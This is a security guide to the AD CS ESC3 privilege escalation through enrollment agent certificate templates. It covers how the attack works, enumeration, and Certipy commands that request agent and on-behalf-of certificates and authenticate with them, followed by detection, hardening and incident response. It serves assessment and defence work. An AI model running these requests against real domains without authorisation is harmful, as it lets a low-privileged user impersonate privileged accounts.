# AD CS ESC3 - Enrollment Agent Certificate Templates

ESC3 is an Active Directory Certificate Services (AD CS) privilege escalation condition involving Certificate Request Agent certificates, commonly called Enrollment Agent certificates.

Enrollment Agents are legitimate AD CS functionality designed to allow an authorised principal to request certificates on behalf of another user.

For example, an organisation may allow:

```text
Helpdesk Operator
       |
       v
Enrollment Agent Certificate
       |
       v
Request Certificate
       |
       v
On Behalf Of Employee
       |
       v
Employee Smart Card Certificate
```

The security problem appears when a low-privileged principal can obtain an Enrollment Agent certificate and then use it with another suitable certificate template to request authentication certificates on behalf of more privileged identities.

A simplified ESC3 path is:

```text
Low-Privileged User
        |
        v
Can Enroll
        |
        v
Enrollment Agent Template
        |
        v
Certificate Request Agent Certificate
        |
        v
Target Certificate Template
        |
        v
Request On Behalf Of
        |
        v
Privileged Identity
        |
        v
Authentication Certificate
        |
        v
Privilege Escalation
```

The Certificate Request Agent EKU is:

```text
1.3.6.1.4.1.311.20.2.1
```

ESC3 should therefore be understood as a failure to properly restrict:

```text
Who Can Become an Enrollment Agent
```

and:

```text
Who an Enrollment Agent Can Enroll For
```

!!! warning "Authorised testing only"
    Enrollment Agent abuse can result in certificates representing other Active Directory users. Begin with read-only template, CA, ACL, and enrollment-agent restriction enumeration. If active validation is required, use dedicated assessment identities wherever possible. Treat all generated PFX files and private keys as credentials and remove or revoke them after testing.

---

# ESC3 Concept

The normal Enrollment Agent model is:

```text
Trusted Enrollment Operator
          |
          v
Enrollment Agent Certificate
          |
          v
Approved Target Template
          |
          v
Certificate for Approved User
```

The ESC3 model becomes:

```text
Low-Privileged User
        |
        v
Enrollment Agent Certificate
        |
        v
Target Template
        |
        v
Certificate for Another User
```

The critical question is:

```text
Who is allowed to obtain Enrollment Agent capability?
```

---

# Certificate Request Agent EKU

The Certificate Request Agent EKU is:

```text
1.3.6.1.4.1.311.20.2.1
```

It is commonly displayed as:

```text
Certificate Request Agent
```

or:

```text
Enrollment Agent
```

A certificate containing this purpose can participate in certificate requests made on behalf of another principal when the CA and target template permit it.

---

# Why Enrollment Agents Exist

Enrollment Agents are not inherently insecure.

They support legitimate workflows such as:

```text
Smart Card Enrollment
Helpdesk-Assisted Enrollment
Controlled Identity Provisioning
Certificate Registration Services
```

For example:

```text
Employee
   |
   v
Identity Verification
   |
   v
Helpdesk Enrollment Agent
   |
   v
Certificate Issued
```

The security problem is excessive access to this capability.

---

# Two Components of ESC3

A practical ESC3 path generally requires two certificate templates.

```text
Template 1
    |
    v
Enrollment Agent Certificate
```

and:

```text
Template 2
    |
    v
Certificate Requested On Behalf Of Target
```

Think of them as:

```text
Agent Template
      +
Target Template
      =
ESC3 Path
```

---

# Stage 1 - Obtain Enrollment Agent Certificate

The first template issues a certificate containing:

```text
Certificate Request Agent
```

The attacker's effective security context must be able to enroll.

Conceptually:

```text
alice
  |
  v
Enroll
  |
  v
EnrollmentAgentTemplate
  |
  v
Enrollment Agent Certificate
```

---

# Stage 2 - Request Certificate On Behalf Of Another User

The Enrollment Agent certificate is then presented during another certificate request.

Conceptually:

```text
Enrollment Agent Certificate
          |
          v
Target Template
          |
          v
Request On Behalf Of
          |
          v
bob
          |
          v
Certificate for Bob
```

If Bob is privileged:

```text
bob
 |
 +--> Domain Administrator
```

the resulting certificate may create a privilege escalation path.

---

# Complete ESC3 Path

```text
Low-Privileged User
        |
        v
Agent Template
        |
        v
Certificate Request Agent EKU
        |
        v
Enrollment Agent Certificate
        |
        v
Target Template
        |
        v
On-Behalf-Of Request
        |
        v
Privileged User
        |
        v
Authentication Certificate
        |
        v
Certificate Authentication
```

Both stages must be evaluated.

---

# ESC3 Condition 1 - Agent Template

The first template generally requires:

```text
Template Published by CA
        +
Attacker Can Enroll
        +
Certificate Request Agent EKU
        +
No Effective Approval Barrier
```

---

# Agent Template Enrollment

Review who can enroll.

Potentially dangerous groups include:

```text
Domain Users
Authenticated Users
Everyone
Domain Computers
Large Department Groups
```

A dedicated tightly controlled enrollment-agent group is substantially safer.

---

# Agent Template Manager Approval

Review whether:

```text
CA Certificate Manager Approval
```

is required.

Without approval:

```text
Request
   |
   v
Automatic Issuance
```

With approval:

```text
Request
   |
   v
Pending
   |
   v
CA Manager
   |
   +--> Approve
   |
   +--> Deny
```

This can materially change exploitability.

---

# Agent Template Authorized Signatures

Review:

```text
Authorized Signatures
```

If additional signatures are required:

```text
Request
   |
   v
Required Signature
   |
   X
Requester Cannot Satisfy Requirement
```

the straightforward enrollment path may fail.

---

# ESC3 Condition 2 - Target Template

The second template is equally important.

The target template must support an enrollment-agent request under the CA's configuration.

Conceptually:

```text
Enrollment Agent Certificate
          |
          v
Target Template
          |
          v
Does Template Accept On-Behalf-Of Enrollment?
          |
          +--> No
          |
          +--> Yes
```

---

# Target Template Authentication Capability

For domain account impersonation, the resulting target certificate normally needs to support an appropriate authentication purpose.

Potentially relevant EKUs include:

```text
Client Authentication
Smart Card Logon
PKINIT Client Authentication
```

The resulting certificate and current Windows certificate mapping behaviour must also be considered.

---

# Client Authentication

The Client Authentication EKU is:

```text
1.3.6.1.5.5.7.3.2
```

---

# Smart Card Logon

The Smart Card Logon EKU is:

```text
1.3.6.1.4.1.311.20.2.2
```

---

# PKINIT Client Authentication

The PKINIT Client Authentication EKU is:

```text
1.3.6.1.5.2.3.4
```

---

# Target Must Be Able to Enroll

An important ESC3 detail is that the identity for whom the certificate is requested must generally satisfy the target template's enrollment requirements.

Conceptually:

```text
Enrollment Agent
      |
      v
Requests for Administrator
      |
      v
Can Administrator Enroll in Target Template?
      |
      +--> No -> Request May Fail
      |
      +--> Yes -> Continue
```

Do not assume:

```text
Enrollment Agent
      =
Certificate for Literally Anyone
```

---

# Template Schema Version

Certificate template schema version is particularly important in ESC3 analysis.

Retrieve:

```text
msPKI-Template-Schema-Version
```

Typical values include:

```text
1
2
3
4
```

The available issuance controls differ between template versions.

---

# Schema Version 1 Templates

Version 1 templates are especially important in classic ESC3 analysis.

They provide fewer configurable issuance-requirement controls than later versions.

Conceptually:

```text
Version 1 Template
       |
       v
Limited Enrollment-Agent Restrictions
```

This can make suitable Version 1 authentication templates useful ESC3 targets.

---

# Schema Version 2 and Later

Version 2 and newer templates provide more granular issuance requirements.

Administrators can require:

```text
Authorized Signatures
Application Policies
Other Issuance Requirements
```

This can restrict which Enrollment Agent certificates are accepted.

---

# Application Policy Issuance Requirements

A target template can require that the certificate used to sign an on-behalf-of request contains a particular application policy.

For Enrollment Agents, the relevant policy is typically:

```text
Certificate Request Agent
```

with OID:

```text
1.3.6.1.4.1.311.20.2.1
```

This provides an additional control for modern templates.

---

# CA Enrollment Agent Restrictions

The CA itself can also restrict Enrollment Agents.

This is extremely important.

Conceptually:

```text
Enrollment Agent
       |
       v
CA Enrollment Agent Restrictions
       |
       +--> Which Agent?
       |
       +--> Which Template?
       |
       +--> Which Target Identity?
```

Therefore:

```text
Agent Certificate
       |
       X
Automatically Request for Everyone
```

---

# Restriction Model

A secure configuration may permit:

```text
Helpdesk Enrollment Agent
          |
          v
Employee Smart Card Template
          |
          v
Employees Only
```

while preventing:

```text
Helpdesk Enrollment Agent
          |
          X
Domain Admin Certificate
```

---

# Why CA Restrictions Matter

A template may look vulnerable during basic enumeration while the CA enforces restrictions that prevent the full attack path.

Therefore the assessment model must include:

```text
Agent Template
      +
Target Template
      +
CA Restrictions
```

---

# ESC3 vs ESC2

ESC2 and ESC3 are closely related.

ESC2 involves:

```text
Any Purpose
```

or:

```text
No EKU
```

while ESC3 involves the explicit:

```text
Certificate Request Agent
```

EKU.

Conceptually:

```text
ESC2
Broad Certificate Capability
```

versus:

```text
ESC3
Explicit Enrollment Agent Capability
```

---

# ESC2 Can Lead Into ESC3

Because:

```text
Any Purpose
```

can include Enrollment Agent capability, an ESC2 certificate may sometimes be used in an ESC3-style workflow.

Conceptually:

```text
ESC2 Template
      |
      v
Any Purpose Certificate
      |
      v
Enrollment Agent Capability
      |
      v
ESC3 Target Template
```

---

# ESC3 vs ESC1

ESC1:

```text
Requester
   |
   v
Supplies Identity in Request
   |
   v
Certificate for Another Identity
```

ESC3:

```text
Requester
   |
   v
Enrollment Agent Certificate
   |
   v
Requests On Behalf Of
   |
   v
Certificate for Another Identity
```

ESC3 uses an explicitly delegated certificate enrollment mechanism.

---

# ESC3 vs ESC4

ESC4 concerns control over a certificate template.

For example:

```text
Attacker
   |
   v
WriteDACL / GenericAll
   |
   v
Template
```

An attacker with ESC4 may potentially modify a template to introduce another vulnerable configuration.

The root weakness remains the template ACL.

---

# ESC3 vs ESC15

Modern AD CS assessment should also distinguish ESC3 from ESC15.

ESC15 involves abuse of application policies supplied through certain certificate requests against vulnerable configurations associated with older schema-version templates and the CVE-2024-49019 class of behaviour.

One possible consequence is obtaining:

```text
Certificate Request Agent
```

capability.

That can then lead into an ESC3-style second stage.

Conceptually:

```text
ESC15
   |
   v
Certificate Request Agent Capability
   |
   v
ESC3-Style On-Behalf-Of Request
```

The initial weakness is still ESC15 rather than ESC3.

---

# Enumerating ESC3 with Certipy

Begin with:

```bash
certipy --help
```

Then:

```bash
certipy find -h
```

A typical authenticated enumeration pattern is:

```bash
certipy find -u 'audit-user@corp.example' -p 'PASSWORD' -dc-ip 10.10.10.10 -stdout
```

Use an approved assessment identity.

---

# Certipy ESC3 Output

Modern Certipy output may identify:

```text
Enrollment Agent
```

and:

```text
ESC3
```

for templates containing the Certificate Request Agent EKU.

It may also identify:

```text
ESC3 Target Template
```

for templates potentially usable during the second stage.

---

# Example Analysis

Conceptually:

```text
Template:
CorpEnrollmentAgent

Enrollment Agent:
True

Extended Key Usage:
Certificate Request Agent

User Enrollable Principals:
Domain Users

Vulnerability:
ESC3
```

This identifies a candidate agent template.

---

# Target Template Output

A second template may be identified as:

```text
ESC3 Target Template
```

This does not mean that template is independently vulnerable.

Instead it means:

```text
Suitable as Part of an ESC3 Chain
```

---

# Do Not Misreport Target Templates

Avoid reporting:

```text
User Template Is Vulnerable to ESC3
```

merely because tooling marks it as:

```text
ESC3 Target Template
```

The finding is the complete attack path.

---

# Native PowerShell Enumeration

Locate certificate templates:

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties * |
    Select-Object Name,DisplayName
```

---

# Enumerate Certificate Request Agent Templates

Search for:

```text
1.3.6.1.4.1.311.20.2.1
```

using:

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.1)' -Properties pKIExtendedKeyUsage |
    Select-Object Name,DisplayName,pKIExtendedKeyUsage
```

---

# Enumerate All EKUs

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties pKIExtendedKeyUsage |
    Select-Object Name,DisplayName,pKIExtendedKeyUsage
```

---

# Enumerate Schema Versions

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties 'msPKI-Template-Schema-Version' |
    Select-Object Name,DisplayName,'msPKI-Template-Schema-Version'
```

---

# Find Version 1 Templates

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(&(objectClass=pKICertificateTemplate)(msPKI-Template-Schema-Version=1))' -Properties pKIExtendedKeyUsage |
    Select-Object Name,DisplayName,pKIExtendedKeyUsage
```

Review whether these templates are relevant as ESC3 targets.

---

# Find Authentication-Capable Version 1 Templates

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(&(objectClass=pKICertificateTemplate)(msPKI-Template-Schema-Version=1))' -Properties pKIExtendedKeyUsage |
    Where-Object {
        ($_.pKIExtendedKeyUsage -contains '1.3.6.1.5.5.7.3.2') -or
        ($_.pKIExtendedKeyUsage -contains '1.3.6.1.4.1.311.20.2.2') -or
        ($_.pKIExtendedKeyUsage -contains '1.3.6.1.5.2.3.4')
    } |
    Select-Object Name,DisplayName,pKIExtendedKeyUsage
```

This provides candidate target templates.

---

# Enumerate Issuance Requirements

Retrieve:

```text
msPKI-RA-Signature
msPKI-RA-Application-Policies
msPKI-Enrollment-Flag
```

with:

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $templateBase -LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties 'msPKI-RA-Signature','msPKI-RA-Application-Policies','msPKI-Enrollment-Flag' |
    Select-Object Name,'msPKI-RA-Signature','msPKI-RA-Application-Policies','msPKI-Enrollment-Flag'
```

---

# Enumerate Published Templates

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$enrollmentBase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $enrollmentBase -LDAPFilter '(objectClass=pKIEnrollmentService)' -Properties certificateTemplates,dNSHostName |
    Select-Object Name,dNSHostName,certificateTemplates
```

Both relevant templates must be available through an appropriate issuing CA.

---

# Find CA for Agent Template

```powershell
$templateName = 'CorpEnrollmentAgent'

$configNC = (Get-ADRootDSE).configurationNamingContext
$enrollmentBase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"

Get-ADObject -SearchBase $enrollmentBase -LDAPFilter '(objectClass=pKIEnrollmentService)' -Properties certificateTemplates,dNSHostName |
    Where-Object {
        $_.certificateTemplates -contains $templateName
    } |
    Select-Object Name,dNSHostName
```

Repeat for the target template.

---

# Template ACL Enumeration

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateDN = "CN=CorpEnrollmentAgent,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

(Get-Acl "AD:$templateDN").Access |
    Select-Object IdentityReference,ActiveDirectoryRights,AccessControlType,ObjectType,IsInherited
```

Review effective enrollment rights.

---

# Target Template ACL

Also inspect the target template:

```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templateDN = "CN=CorpUser,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

(Get-Acl "AD:$templateDN").Access |
    Select-Object IdentityReference,ActiveDirectoryRights,AccessControlType,ObjectType,IsInherited
```

Remember that the target identity's ability to enroll is relevant.

---

# LDAP Enumeration from Linux

Agent templates can be found using LDAP:

```bash
ldapsearch \
    -x \
    -H ldap://dc01.corp.example \
    -D 'CORP\audit-user' \
    -W \
    -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=example' \
    '(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.1)' \
    cn \
    displayName \
    pKIExtendedKeyUsage \
    msPKI-Template-Schema-Version \
    msPKI-RA-Signature \
    msPKI-RA-Application-Policies \
    msPKI-Enrollment-Flag
```

---

# Enumerate All Potential Targets

```bash
ldapsearch \
    -x \
    -H ldap://dc01.corp.example \
    -D 'CORP\audit-user' \
    -W \
    -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=example' \
    '(objectClass=pKICertificateTemplate)' \
    cn \
    displayName \
    pKIExtendedKeyUsage \
    msPKI-Template-Schema-Version \
    msPKI-RA-Signature \
    msPKI-RA-Application-Policies
```

Use this to correlate agent and target template conditions.

---

# PowerView

PowerView can assist with template ACL analysis:

```powershell
Get-DomainObjectAcl -Identity 'CN=CorpEnrollmentAgent,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=example' -ResolveGUIDs
```

Look for:

```text
Enroll
Autoenroll
GenericAll
GenericWrite
WriteProperty
WriteDACL
WriteOwner
```

---

# BloodHound

BloodHound is useful because the effective ESC3 path may involve several Active Directory relationships.

For example:

```text
alice
  |
  v
MemberOf
  |
  v
PKI-Enrollment
  |
  v
Enroll
  |
  v
Enrollment Agent Template
```

The certificate path may then continue to:

```text
Enrollment Agent Template
        |
        v
Target Template
        |
        v
Privileged Identity
```

---

# Indirect Enrollment Rights

An attacker might not directly have enrollment rights.

Example:

```text
alice
  |
  v
AddMember
  |
  v
Enrollment-Agent-Users
  |
  v
Enroll
```

The attack path should therefore include:

```text
Effective Permissions
```

rather than only direct template ACL entries.

---

# Certify

Certify can also assist with AD CS template analysis from Windows.

Always start with:

```text
Certify.exe --help
```

because syntax differs significantly between older and newer releases.

Review results for:

```text
Enrollment Agent
Certificate Request Agent
Enrollment Rights
Template Schema Version
Issuance Requirements
Target Templates
```

---

# Manual Verification Is Important

An automated:

```text
ESC3
```

result should not automatically become a finding.

Verify:

```text
Can Current User Enroll?
Is Template Published?
Is Manager Approval Disabled?
Are Signatures Required?
Does Agent Certificate Contain Required EKU?
Does a Suitable Target Template Exist?
Can Target Identity Enroll?
Do CA Agent Restrictions Permit It?
Can Resulting Certificate Authenticate?
```

---

# Controlled Active Validation

The safest ESC3 validation hierarchy is:

```text
Read-Only Enumeration
        |
        v
Agent Template Confirmed
        |
        v
Target Template Confirmed
        |
        v
CA Restrictions Reviewed
        |
        v
Request Agent Certificate
        |
        v
Request Test Certificate On Behalf Of
        |
        v
Authenticate if Required
        |
        v
Stop
```

---

# Stage 1 Validation with Certipy

If certificate issuance is explicitly authorised, inspect the installed syntax first:

```bash
certipy req -h
```

A typical current pattern is:

```bash
certipy req \
    -u 'audit-user@corp.example' \
    -p 'PASSWORD' \
    -dc-ip 10.10.10.10 \
    -target 'ca01.corp.example' \
    -ca 'CORP-CA' \
    -template 'CorpEnrollmentAgent'
```

This requests the Enrollment Agent certificate for the authorised assessment account.

---

# Verify the Agent Certificate

Inspect the resulting certificate.

Using OpenSSL:

```bash
openssl pkcs12 -in audit-user.pfx -clcerts -nokeys -passin pass:
```

If the PFX is password protected, use the appropriate password handling rather than exposing it in shell history.

The certificate should contain the expected Enrollment Agent capability.

---

# Inspect Certificate with Certutil

On Windows:

```cmd
certutil -dump agent.cer
```

Look for:

```text
Certificate Request Agent
1.3.6.1.4.1.311.20.2.1
```

---

# Stage 2 - On-Behalf-Of Request

Once an approved Enrollment Agent certificate has been obtained, Certipy can submit an on-behalf-of request against a compatible target template.

First verify syntax:

```bash
certipy req -h
```

A controlled test-account pattern is:

```bash
certipy req \
    -u 'audit-user@corp.example' \
    -p 'PASSWORD' \
    -dc-ip 10.10.10.10 \
    -target 'ca01.corp.example' \
    -ca 'CORP-CA' \
    -template 'CorpUserAuthentication' \
    -pfx 'audit-user.pfx' \
    -on-behalf-of 'CORP\adcs-test-target'
```

Use an approved test identity.

---

# On-Behalf-Of Name Format

Certipy expects the on-behalf-of identity in a format similar to:

```text
DOMAIN\username
```

For example:

```text
CORP\adcs-test-target
```

Use the NetBIOS domain name where required by the installed version.

---

# Successful Stage 2

Conceptually:

```text
audit-user
    |
    v
Enrollment Agent Certificate
    |
    v
CorpUserAuthentication
    |
    v
CORP\adcs-test-target
    |
    v
adcs-test-target.pfx
```

This proves that the enrollment agent can cross the identity boundary.

---

# Certificate Authentication

If authentication validation is required, inspect:

```bash
certipy auth -h
```

A typical pattern is:

```bash
certipy auth -pfx 'adcs-test-target.pfx' -dc-ip 10.10.10.10
```

Successful certificate-based authentication can demonstrate that the certificate maps to the intended test account.

---

# Do Not Automatically Retrieve Additional Credentials

Some certificate-authentication tools may also attempt to recover additional credential material after authentication.

For an ESC3 assessment, the required proof is usually:

```text
Certificate Issued for Another Identity
```

or:

```text
Certificate Authentication Succeeded
```

Do not continue into unnecessary credential extraction unless it is explicitly required by the engagement.

---

# Safer Test Account Model

Prefer:

```text
adcs-test-agent
       |
       v
Enrollment Agent Certificate
       |
       v
adcs-test-target
```

rather than:

```text
Compromised User
       |
       v
Enrollment Agent Certificate
       |
       v
Domain Administrator
```

Both demonstrate the identity trust boundary, but the first reduces production impact.

---

# Privileged Validation

If the engagement specifically requires proof involving a privileged account:

```text
Obtain Approval
      |
      v
Request One Certificate
      |
      v
Authenticate Once
      |
      v
Record Evidence
      |
      v
Stop
      |
      v
Revoke Certificate
```

Do not perform unrelated privileged activity.

---

# PFX Security

An Enrollment Agent PFX can be especially sensitive.

It may allow additional certificate issuance while it remains valid.

Never:

```text
Commit It to Git
Store It in Shared Notes
Attach It to a Report
Upload It to Public Services
Leave It in /tmp
Reuse It Outside the Engagement
```

---

# Evidence Collection

Useful Stage 1 evidence includes:

```text
Agent Template
Agent Template EKUs
CA
Requester
Enrollment Rights
Manager Approval
Authorized Signatures
Agent Certificate Serial Number
Agent Certificate Thumbprint
```

Useful Stage 2 evidence includes:

```text
Target Template
Target Identity
On-Behalf-Of Request
Issued Certificate Subject
Issued Certificate SAN
Issued Certificate Serial Number
Issued Certificate Thumbprint
Authentication Result
```

---

# Do Not Include Private Keys in Reports

The report does not require:

```text
PFX Private Key
PEM Private Key
Certificate Password
```

Use non-secret metadata instead.

---

# Authentication and Certificate Mapping

Modern Windows certificate mapping protections remain relevant.

The resulting certificate should be analysed for:

```text
Identity
SID Security Extension
Issuer
Certificate Mapping
Authentication EKU
```

Do not assume that every certificate issued on behalf of another identity automatically produces successful Kerberos authentication.

---

# Strong Certificate Mapping

Microsoft certificate-based authentication hardening changed how Domain Controllers map certificates to accounts.

Therefore the full path is:

```text
Enrollment Agent
      |
      v
Certificate for Target
      |
      v
Certificate Mapping
      |
      v
Mapped Identity
      |
      v
Authentication
```

This is more precise than:

```text
Certificate Issued
      =
Account Compromised
```

---

# Password Reset Does Not Revoke Certificates

If a certificate representing a privileged user has already been issued:

```text
Reset User Password
       |
       X
Certificate Automatically Revoked
```

The certificate must be separately addressed.

---

# Enrollment Agent Persistence

An attacker who obtains a long-lived Enrollment Agent certificate may retain the ability to request additional certificates later.

Conceptually:

```text
Enrollment Agent Certificate
          |
          v
Password Rotation
          |
          X
Agent Certificate Removed
```

This makes agent-certificate lifetime important.

---

# Certificate Validity

Record:

```text
Not Before
Not After
```

for both:

```text
Enrollment Agent Certificate
```

and:

```text
Target Certificate
```

Long-lived certificates increase the persistence window.

---

# Detection

ESC3 detection should consider both stages.

```text
Stage 1
Enrollment Agent Certificate Issuance

Stage 2
On-Behalf-Of Certificate Issuance

Stage 3
Certificate Authentication
```

---

# Inventory Enrollment Agent Templates

Defenders should identify every template containing:

```text
Certificate Request Agent
```

and determine:

```text
Why Does It Exist?
Who Can Enroll?
Who Owns It?
Which CA Publishes It?
Which Restrictions Apply?
```

---

# Broad Enrollment Is High Risk

Prioritise agent templates where enrollment includes:

```text
Domain Users
Authenticated Users
Everyone
Domain Computers
Large Non-PKI Groups
```

Enrollment Agent capability should normally be narrowly delegated.

---

# Monitor Template Changes

Certificate template changes can be monitored through Directory Service Changes auditing.

Relevant events can include:

```text
5136
```

when auditing is configured.

Monitor changes to:

```text
pKIExtendedKeyUsage
msPKI-RA-Signature
msPKI-RA-Application-Policies
msPKI-Enrollment-Flag
nTSecurityDescriptor
```

---

# Detect Certificate Request Agent EKU Addition

A suspicious sequence is:

```text
Normal Template
      |
      v
Template Modified
      |
      v
Certificate Request Agent Added
      |
      v
Certificate Requested
```

Correlating the modification and issuance greatly improves detection quality.

---

# Detect Enrollment-Agent Certificate Issuance

Enrollment Agent certificates should normally be rare.

Baseline:

```text
Approved Agent Accounts
Approved Templates
Approved Enrollment Hosts
Normal Request Frequency
Normal Working Hours
```

Alert on deviations.

---

# Detect On-Behalf-Of Requests

Monitor requests where:

```text
Requester
```

and:

```text
Certificate Subject
```

represent different identities.

That difference can be legitimate for Enrollment Agents, but it should match an approved workflow.

---

# Example Detection Relationship

```text
Requester:
CORP\helpdesk-agent

Certificate Subject:
CORP\alice
```

may be normal.

But:

```text
Requester:
CORP\ordinary-user

Certificate Subject:
CORP\Administrator
```

is substantially more suspicious.

---

# Monitor Privileged Target Identities

Pay particular attention to certificates issued for:

```text
Domain Admins
Enterprise Admins
Administrators
Domain Controllers
PKI Administrators
Tier 0 Service Accounts
```

through Enrollment Agent workflows.

---

# Monitor Certificate Authentication

After suspicious certificate issuance, correlate authentication telemetry.

Relevant activity can include:

```text
Kerberos TGT Requests
Certificate-Based Authentication
Privileged Logons
LDAP Activity
SMB Activity
WinRM Activity
```

---

# Event 4768

Kerberos TGT requests generate:

```text
4768
```

on Domain Controllers when appropriate auditing is enabled.

Modern Windows versions can expose additional certificate-related fields for certificate-based Kerberos authentication.

Use current Microsoft event documentation when creating production detections.

---

# Event 5136

Monitor:

```text
5136
```

for changes to certificate-template objects and other PKI configuration stored in Active Directory.

Particularly important changes include:

```text
EKUs
Issuance Requirements
Enrollment Permissions
Template Security Descriptor
```

---

# CA Auditing

AD CS auditing should be enabled and forwarded to central monitoring.

Useful categories include:

```text
Certificate Requests
Certificate Issuance
Certificate Denial
CA Configuration Changes
Certificate Manager Activity
```

The exact event coverage depends on CA audit configuration.

---

# Correlation Model

A strong ESC3 detection combines:

```text
Enrollment Agent Certificate Issued
          |
          v
Same Principal
          |
          v
On-Behalf-Of Request
          |
          v
Privileged Target
          |
          v
Certificate Authentication
```

This is much stronger than alerting on a single event.

---

# Hardening ESC3

The primary security objective is:

```text
Only Trusted Principals Should Become Enrollment Agents
```

and:

```text
Enrollment Agents Should Only Enroll Approved Identities
```

---

# Restrict Agent Template Enrollment

Replace broad enrollment groups with a dedicated group.

For example:

```text
PKI-Enrollment-Agents
```

Membership should be:

```text
Small
Documented
Reviewed
Privileged
Monitored
```

---

# Require Manager Approval

For sensitive Enrollment Agent certificates, consider:

```text
CA Certificate Manager Approval
```

where operationally appropriate.

This creates a human approval boundary.

---

# Require Authorized Signatures

Where appropriate, configure issuance requirements requiring approved signatures.

This can prevent automatic agent-certificate issuance.

---

# Configure Enrollment Agent Restrictions

This is one of the most important ESC3 mitigations.

Restrict:

```text
Which Enrollment Agents
```

can request:

```text
Which Certificate Templates
```

for:

```text
Which Users
```

---

# Secure Restriction Model

Instead of:

```text
Enrollment Agent
      |
      v
Any Template
      |
      v
Any User
```

use:

```text
Specific Enrollment Agent
          |
          v
Specific Smart Card Template
          |
          v
Specific Employee Population
```

---

# Protect Agent Accounts

Enrollment Agent accounts should be treated as privileged identities.

Apply:

```text
Strong Authentication
Dedicated Accounts
Restricted Workstations
Minimal Group Membership
No Email / Browsing Where Possible
Monitoring
Credential Rotation
```

appropriate to the organisation's PKI model.

---

# Protect Agent Private Keys

Enrollment Agent private keys are powerful credentials.

Where possible use:

```text
Non-Exportable Keys
TPM
Smart Card
Hardware Security Module
Strong Key ACLs
```

depending on the workflow.

---

# Review Certificate Lifetime

Avoid unnecessarily long Enrollment Agent certificate validity.

A certificate valid for:

```text
5 Years
```

creates a much larger exposure window than one valid for a shorter operationally appropriate period.

---

# Protect Template ACLs

Restrict:

```text
GenericAll
GenericWrite
WriteProperty
WriteDACL
WriteOwner
```

on both:

```text
Agent Template
```

and:

```text
Target Template
```

Otherwise an attacker may be able to alter the enrollment model.

---

# Restrict Target Templates

Review which templates can participate in on-behalf-of enrollment.

Sensitive authentication templates should not accept unrestricted Enrollment Agents.

---

# Remove Unused Agent Templates

If Enrollment Agent functionality is not used:

```text
Unpublish Agent Template
```

and retire it following dependency analysis.

Unused privileged PKI functionality creates unnecessary attack surface.

---

# Review Built-In Templates

Do not assume built-in templates are safe simply because they are Microsoft defaults.

Review:

```text
EnrollmentAgent
User
Machine
SmartcardUser
SmartcardLogon
```

and other relevant templates according to the organisation's actual publication and permission model.

---

# Do Not Delete Templates Blindly

Certificate templates can support critical production systems.

Before changing or removing them:

```text
Identify Dependencies
Identify Issued Certificates
Identify Autoenrollment
Identify Applications
Test Changes
Deploy Gradually
```

---

# Incident Response

If ESC3 abuse is suspected:

```text
Identify Agent Template
       |
       v
Identify Agent Certificate
       |
       v
Identify Requester
       |
       v
Identify On-Behalf-Of Requests
       |
       v
Identify Target Certificates
       |
       v
Identify Authentication
       |
       v
Revoke Certificates
       |
       v
Fix PKI Configuration
```

---

# Identify Enrollment Agent Certificate

Collect:

```text
Serial Number
Thumbprint
Subject
Issuer
Template
Requester
Issue Time
Expiration
EKUs
```

---

# Identify Derived Certificates

Search for certificates requested using the Enrollment Agent certificate.

Determine:

```text
Which Identities?
Which Templates?
When?
From Which Hosts?
```

---

# Identify Privileged Targets

Prioritise:

```text
Domain Administrators
Enterprise Administrators
Domain Controllers
PKI Administrators
Service Accounts
Other Tier 0 Identities
```

---

# Revoke Agent Certificate

The compromised Enrollment Agent certificate should be revoked.

Conceptually:

```text
Agent Certificate
       |
       v
Revoke
       |
       v
Publish Updated Revocation Information
```

---

# Revoke Derived Certificates

Also revoke certificates issued through malicious on-behalf-of requests.

Revoking only the agent certificate does not automatically eliminate certificates already issued through it.

---

# Password Rotation

Rotate credentials where appropriate, but remember:

```text
Password Reset
      |
      X
Certificate Revocation
```

Certificate credentials must be addressed independently.

---

# Investigate Template Changes

Determine whether the attacker:

```text
Only Used Existing ESC3
```

or:

```text
Created ESC3 Conditions
```

through template ACL abuse.

Review:

```text
5136
ACL Changes
Template Owner Changes
EKU Changes
Issuance Requirement Changes
```

---

# Investigate CA Changes

Also inspect:

```text
Enrollment Agent Restrictions
CA ACL
CA Configuration
Published Templates
Certificate Manager Activity
```

